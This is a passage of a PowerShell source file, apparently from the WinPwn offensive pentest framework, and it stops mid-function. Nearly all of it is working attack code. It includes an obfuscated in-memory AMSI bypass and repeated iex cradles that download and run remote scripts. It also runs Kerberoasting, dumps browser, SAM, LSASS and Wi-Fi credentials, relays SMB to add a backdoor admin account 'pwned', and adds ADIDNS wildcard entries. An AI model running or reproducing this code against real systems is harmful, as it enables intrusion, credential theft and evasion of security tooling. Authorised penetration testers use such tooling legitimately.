#  Global TLS Setting for all functions. If TLS12 isn't suppported you will get an exception when using the -Verbose parameter.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12

function AmsiBypass
{
    #This is Rastamouses in memory patch method 
    $ztzsw = @"
using System;
using System.Runtime.InteropServices;
public class ztzsw {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr msrelr, uint flNewProtect, out uint lpflOldProtect);
}
"@

  Add-Type $ztzsw

  $kgqdegv = [ztzsw]::LoadLibrary("$([CHar](97)+[CHar](109*53/53)+[cHAR]([ByTE]0x73)+[chAr]([bYTE]0x69)+[char]([byTE]0x2e)+[cHar](100*35/35)+[Char]([bytE]0x6c)+[ChAr]([BYtE]0x6c))")
  $dfwxos = [ztzsw]::GetProcAddress($kgqdegv, "$([char]([BytE]0x41)+[CHar]([byTE]0x6d)+[ChAR]([byTe]0x73)+[Char](105+69-69)+[ChAr](83+2-2)+[cHaR]([BYTe]0x63)+[chAR]([bYtE]0x61)+[Char]([Byte]0x6e)+[CHAr](42+24)+[CHAR](117+79-79)+[CHAR](88+14)+[cHAR]([bYte]0x66)+[CHAR](101+22-22)+[cHar]([bYTe]0x72))")
  $p = 0
  $qddw = "0xB8"
  $fwyu = "0x80"
  $bsyb = "0x57"
  [ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
  $ymfa = "0x07"
  $zcbf = "0x00"
  $dned = "0xC3"
  $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
  [System.Runtime.InteropServices.Marshal]::Copy($msueg, 0, $dfwxos, 6)

}

$Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"

function dependencychecks
{
    <#
        .DESCRIPTION
        Checks for System Role, Powershell Version, Proxy active/not active, Elevated or non elevated Session.
        Creates the Log directories or checks if they are already available.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
         [int]$systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole



         $systemRoles = @{
                              0         =    " Standalone Workstation    " ;
                              1         =    " Member Workstation        " ;
                              2         =    " Standalone Server         " ;
                              3         =    " Member Server             " ;
                              4         =    " Backup  Domain Controller " ;
                              5         =    " Primary Domain Controller "       
         }

        #Proxy Detect #1
        proxydetect
        pathcheck
        $PSVersion=$PSVersionTable.PSVersion.Major
        
        write-host "[?] Checking for Default PowerShell version ..`n" -ForegroundColor black -BackgroundColor white  ; sleep 1
        
        if($PSVersion -lt 2){
           
                Write-Warning  "[!] You have PowerShell v1.0.`n"
            
                Write-Warning  "[!] This script only supports Powershell verion 2 or above.`n"
                       
                exit  
        }
        
        write-host "       [+] ----->  PowerShell v$PSVersion`n" ; sleep 1
        
        write-host "[?] Detecting system role ..`n" -ForegroundColor black -BackgroundColor white ; sleep 1
        
        $systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
        
        if(($systemRoleID -ne 1) -or ($systemRoleID -ne 3) -or ($systemRoleID -ne 4) -or ($systemRoleID -ne 5)){
        
                "       [-] Some features in this script need access to the domain. They can only be run on a domain member machine. Pwn some domain machine for them!`n"
                              
                   
        }
        
        write-host "       [+] ----->",$systemRoles[[int]$systemRoleID],"`n" ; sleep 1

                    $Lookup = @{
    378389 = [version]'4.5'
    378675 = [version]'4.5.1'
    378758 = [version]'4.5.1'
    379893 = [version]'4.5.2'
    393295 = [version]'4.6'
    393297 = [version]'4.6'
    394254 = [version]'4.6.1'
    394271 = [version]'4.6.1'
    394802 = [version]'4.6.2'
    394806 = [version]'4.6.2'
    460798 = [version]'4.7'
    460805 = [version]'4.7'
    461308 = [version]'4.7.1'
    461310 = [version]'4.7.1'
    461808 = [version]'4.7.2'
    461814 = [version]'4.7.2'
    528040 = [version]'4.8'
    528049 = [version]'4.8'
    }

    write-host "       [+] -----> Installed .NET Framework versions "

    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
  Get-ItemProperty -name Version, Release -EA 0 |
  Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
  Select-Object @{name = ".NET Framework"; expression = {$_.PSChildName}}, 
  @{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release

}

function pathCheck
{
  <#
        .DESCRIPTION
        Checks for correct path dependencies.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Dependency Check
        $currentPath = (Get-Item -Path ".\" -Verbose).FullName                
        Write-Host -ForegroundColor Yellow 'Creating/Checking Log Folders in '$currentPath' directory:'
        
        if(!(Test-Path -Path $currentPath\LocalRecon\)){mkdir $currentPath\LocalRecon\}
        if(!(Test-Path -Path $currentPath\DomainRecon\)){mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
        if(!(Test-Path -Path $currentPath\LocalPrivEsc\)){mkdir $currentPath\LocalPrivEsc\}
        if(!(Test-Path -Path $currentPath\Exploitation\)){mkdir $currentPath\Exploitation\}
        if(!(Test-Path -Path $currentPath\Vulnerabilities\)){mkdir $currentPath\Vulnerabilities\}
        if(!(Test-Path -Path $currentPath\LocalPrivEsc\)){mkdir $currentPath\LocalPrivEsc\}

}

function sharpcradle{
  <#
      .DESCRIPTION
        Download .NET Binary to RAM.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
        Param
    (
        [switch]
        $allthosedotnet,
      [switch]
        $web,
        [string]
        $argument1,
        [string]
        $argument2,
        [string]
        $argument3,
        [Switch]
        $consoleoutput,
        [switch]
        $noninteractive
    )
    
    if(!$consoleoutput){pathcheck}
    BlockEtw
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if ($allthosedotnet)
    {
        @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> Automate some internal Penetrationtest processes
'@
        if ($noninteractive)
        {
            Write-Host -ForegroundColor Yellow 'Executing Seatbelt.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
            if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all" >> "$currentPath\LocalPrivesc\Seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all"}
            
            Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
            if(!$consoleoutput){
                Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt" 
                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"
                Get-Content $currentPath\Exploitation\ASreproasting.txt
                Get-Content $currentPath\Exploitation\Kerberoasting_Rubeus.txt
            }
            else
            {
                Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
            }

            Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
            if(!$consoleoutput){
                Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
                Get-Content $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
            }
            else
            {
                Invoke-watson
            }
            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
            if(!$consoleoutput){
                Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt
            }
            else
            {
                Invoke-Sharpweb -command "all"
            }
            Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns.'
            iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
            if (isadmin)
            {
                if(!$consoleoutput){Invoke-SharpUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command "audit"}
            }
            else
            {
                if(!$consoleoutput){Invoke-SharpUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command " "}
            }

            if (isadmin)
            {
                Write-Host -ForegroundColor Yellow 'Running Internalmonologue.'
                iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
                if(!$consoleoutput){
                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\Internalmonologue.txt
                    Get-Content $currentPath\Exploitation\Internalmonologue.txt
                }
                else
                {
                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
                }
             }
             else
             {
                Write-Host -Foregroundcolor Yellow "Run as admin."
             }
            
            return
        }
        
        do
        {
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. Seatbelt '
            Write-Host -ForegroundColor Green '2. Kerberoasting Using Rubeus! '
            Write-Host -ForegroundColor Green '3. Search for missing windows patches Using Watson! '
            Write-Host -ForegroundColor Green '4. Get all those Browser Credentials with Sharpweb! '
            Write-Host -ForegroundColor Green '5. Check common Privesc vectors using Sharpup! '
            Write-Host -ForegroundColor Green '6. Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS! '
            Write-Host -ForegroundColor Green '7. Go back. '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            

            Switch ($masterquestion) 
            {
                 1{Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to the console only';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command "-group=all -outputfile=$currentPath\LocalPrivesc\Seatbelt.txt"; pause}
                2{Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt"; Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"}
                3{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt;  }
                4{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1');Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
                5{Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\';iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');if (isadmin){Invoke-SharpUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt;} }
                6{if (isadmin){Write-Host -ForegroundColor Yellow 'Running Internalmonologue. Output goes to .\Exploitation\'; iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1');Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\SafetyCreds.txt}else{Write-Host -Foregroundcolor Yellow "Run as admin.";pause}}
            }
        }
        While ($masterquestion -ne 7)
    	      
	    
    }
    if ($web)
    {
          iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/S3cur3Th1sSh1t/Creds/raw/master/pwned_x64/notepad.exe'
          $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
          if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
            {
                $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file:'
                $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable?'
              if ($arg1 -eq "yes" -or $arg1 -eq "y" -or $arg1 -eq "Yes" -or $arg1 -eq "Y")
                {
                    $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file:'
                    Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
                }
                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
             
            }

            	
    }
}

function customRubeus
{
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
    $customCommand = Read-Host -Prompt "Please enter the command you want to execute:"
    Invoke-Rubeus -Command "$customCommand" 
}

function isadmin
{
    # Check if Elevated
    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $isAdmin
}

function Inveigh {
  <#
      .DESCRIPTION
        Starts Inveigh in a parallel window.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    pathcheck
    $currentip = Get-currentIP
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks? (yes/no)'
    
    if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
    {
        $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
        $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
        $Wcl = new-object System.Net.WebClient
        $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-InveighRelay.ps1")
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBClient.ps1")
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBEnum.ps1")
        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBExec.ps1")

        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session

        Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
    }
    
    IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/PowerSharpPack/master/PowerSharpBinaries/Invoke-Inveigh.ps1")
    if (isadmin)
    {
            $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;Invoke-Inveigh -SNIFFER Y -ICMPv6 Y -DHCPv6 Y -MDNS Y -NBNS Y -HTTPS Y -Console 5 -Local Y -SpooferIP $IPaddress.IPv4Address.IPAddress -FileDirectory $currentPath\
	}
    else 
    {
            $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;Invoke-Inveigh -SNIFFER N -ICMPv6 N -DHCPv6 Y -MDNS Y -NBNS Y -HTTPS Y -Console 5 -Local Y -SpooferIP $IPaddress.IPv4Address.IPAddress -FileDirectory $currentPath\
	}
    
}


function adidnsmenu
{

    pathcheck
    do
        {
       @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> ADIDNS menu @S3cur3Th1sSh1t
'@
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. Add ADIDNS Node! '
            Write-Host -ForegroundColor Green '2. Remove ADIDNS Node! '
            Write-Host -ForegroundColor Green '3. Add Wildcard entry! '
            Write-Host -ForegroundColor Green '4. Remove Wildcard entry'
          Write-Host -ForegroundColor Green '5. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{adidns -add}
                2{adidns -remove}
                3{adidns -addwildcard}
                4{adidns -removewildcard}
             }
        }
        While ($masterquestion -ne 5)
         
           
}



function adidns
{
         param(
        [switch]
        $addwildcard,
        [switch]
        $removewildcard,
        [switch]
        $add,
        [switch]
        $remove
  )
    pathcheck
    # Kevin-Robertsons Powermad for Node creation
    IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/PowershellScripts/Powermad.ps1")
    if ($addwildcard)
    {
        $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
        if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
        {
            $target = read-host "Please enter the IP-Adress for the wildcard entry"
          New-ADIDNSNode -Node * -Tombstone -Verbose -data $target
            Write-Host -ForegroundColor Red 'Be sure to remove the record with `Remove-ADIDNSNode -Node * -Verbose` at the end of your tests'
        }
    }
    if($removewildcard)
    {
        Remove-ADIDNSNode -Node *
    }
    if($add)
    {
       $target = read-host "Please enter the IP-Adress for the ADIDNS entry"
       $node = read-host "Please enter the Node name"
     New-ADIDNSNode -Node $node -Tombstone -Verbose -data $target
    }
    if($remove)
    {
       $node = read-host "Please enter the Node name to be removed"
     Remove-ADIDNSNode -Node $node
    }

           
}

function SessionGopher 
{
    <#
      .DESCRIPTION
        Starts slightly obfuscated SessionGopher to search for Cached Credentials.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
     param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $allsystems
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/segoph.ps1')
    $whole_domain = "no"
    if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
    if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
    {
            
          $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain >> "$currentPath\LocalRecon\SessionGopher.txt"}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                if(!$consoleoutput){Invoke-S3ssionGoph3r -Alldomain >> $currentPath\LocalRecon\SessionGopher.txt}else{Invoke-S3ssionGoph3r -Alldomain}
            }
    }
    else
    {
        $session = "no"
      if(!$noninteractive)
        {
            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
        }
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                Invoke-S3ssionGoph3r -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                Invoke-S3ssionGoph3r >> $currentPath\LocalRecon\SessionGopher.txt
            }
    }
    if ($noninteractive -and $consoleoutput)
    {
        if ($allsystems)
        {
            Invoke-S3ssionGoph3r -AllDomain
        }
        Invoke-S3ssionGoph3r -Thorough
    }
}


function Kittielocal 
{
    <#
      .DESCRIPTION
        Dumps Credentials from Memory / Registry / SAM Database / Browsers / Files / DPAPI.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [switch]
        $credentialmanager,
        [switch]
        $mimikittie,
        [switch]
        $rundll32lsass,
        [switch]
        $lazagne,
        [switch]
        $browsercredentials,
        [switch]
        $mimikittenz,
        [switch]
        $wificredentials,
        [switch]
        $samdump,
        [switch]
        $sharpcloud,
        [Switch]
        $teamviewer
    )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    AmsiBypass
    if ($noninteractive)
    {
        if ($credentialmanager)
        {
            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/DumpWCM.ps1')
            Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"
            if(!$consoleoutput){Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}else{Invoke-WCMDump}
        }
        if($mimikittie)
        {
            if (isadmin){if(!$consoleoutput){obfuskittiedump -noninteractive}else{obfuskittiedump -noninteractive -consoleoutput}}
        }
        if($rundll32lsass)
        {
            if(isadmin){if(!$consoleoutput){dumplsass -noninteractive}else{dumplsass -noninteractive -consoleoutput}}
        }
        if($lazagne)
        {
            if(!$consoleoutput){lazagnemodule -noninteractive}else{lazagnemodule -noninteractive -consoleoutput}
        }
        if($browsercredentials)
        {
            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
            if(!$consoleoutput){Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}else{Invoke-Sharpweb -command "all"}
        }
        if($mimikittenz)
        {
            if(!$consoleoutput){kittenz -noninteractive}else{kittenz -noninteractive -consoleoutput}
        }
        if($wificredentials)
        {
            if(isadmin){if(!$consoleoutput){wificreds}else{wificreds -noninteractive -consoleoutput}}
        }
        if ($samdump)
        {
            if(isadmin){if(!$consoleoutput){samfile}else{samfile -noninteractive -consoleoutput}}
        }
        if ($sharpcloud)
        {
            if(!$consoleoutput){SharpCloud}else{SharpCloud -noninteractive -consoleoutput}
        }
        if ($teamviewer)
        {
            if(!$consoleoutput){decryptteamviewer}else{decryptteamviewer -consoleoutput -noninteractive}
        } 
        return
    }
      
        do
        {
       @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> Get some credentials
'@
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie! '
            Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
            Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
          Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
          Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
    Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords (Only Version <= 8!'
    Write-Host -ForegroundColor Green '12. Dump and decrypt local SCCM NAA Credentials!'
          Write-Host -ForegroundColor Green '13. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
                2{if (isadmin){obfuskittiedump}}
                3{if(isadmin){safedump}}
                4{if(isadmin){dumplsass}}
                5{lazagnemodule}
                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
            7{kittenz}
            8{if(isadmin){wificreds}}
            9{if(isadmin){samfile}}
      10{SharpCloud}
      11{decryptteamviewer}
      12{SCCMDumpNAA}
             }
        }
        While ($masterquestion -ne 13)
}


function lsassdumps
{
        do
        {
       @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> Dump lsass for sweet creds
'@
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. Use HandleKatz! '
            Write-Host -ForegroundColor Green '2. Use WerDump! '
            Write-Host -ForegroundColor Green '3. Dump lsass using rundll32 technique!'
            Write-Host -ForegroundColor Green '4. Dump lsass using NanoDump!'
            Write-Host -ForegroundColor Green '5. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{if(isadmin){HandleKatz}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
                2{if(isadmin){werDump}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
                3{if(isadmin){Dumplsass}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
                4{if(isadmin){NanoDumpChoose}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
             }
        }
        While ($masterquestion -ne 5)

}

function NanoDumpChoose
{
        do
        {
       @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> NanoDump Submenu
'@
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. Dump LSASS with a valid signature! '
            Write-Host -ForegroundColor Green '2. Dump LSASS with an invalid signature, has to be restored afterwards (see NanoDump README)! '
            Write-Host -ForegroundColor Green '3. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{if(isadmin){NanoDump -valid}}
                2{if(isadmin){NanoDump}}
            }
        }
        While ($masterquestion -ne 3)

}

function NanoDump
{
<#
    .DESCRIPTION
        Execute NanoDump Shellcode to dump lsass.
        Main Credits to https://github.com/helpsystems/nanodump
        Author: Fabian Mosch, Twitter: @ShitSecure
    #>

Param
    (
        [switch]
        $valid
)

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1')

    if ($valid)
